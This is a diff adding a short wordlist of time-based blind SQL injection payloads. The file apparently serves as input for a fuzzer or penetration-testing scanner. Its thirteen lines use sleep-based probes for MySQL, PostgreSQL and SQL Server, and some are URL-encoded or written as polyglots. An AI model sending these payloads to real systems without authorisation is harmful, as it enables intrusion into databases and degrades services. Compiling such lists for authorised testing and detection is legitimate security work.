@@ -1,0 +1,13 @@
+XOR(if(now()=sysdate(),sleep(20),0))OR'
+if(now()=sysdate(),sleep(20),0)
+(select(0)from(select(sleep(20)))v)/*'+(select(3)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*/
+'XOR(if(now()=sysdate(),sleep(20*1),0))XOR'Z
+1+AND+(SELECT+*+FROM+(SELECT(SLEEP(20)))YYYY)+AND+'%'='
+1'XOR(if(now()=sysdate(),sleep(20),0))OR'
+1+AND+(SELECT+1337+FROM+(SELECT(SLEEP(20)))YYYY)-1337
+1+or+sleep(20)#
+'+WAITFOR+DELAY+'0:0:20'--
+';SELECT+PG_SLEEP(20)--
+pg_sleep(20)
+-sleep(20)
+'|+|pg_sleep(20)--
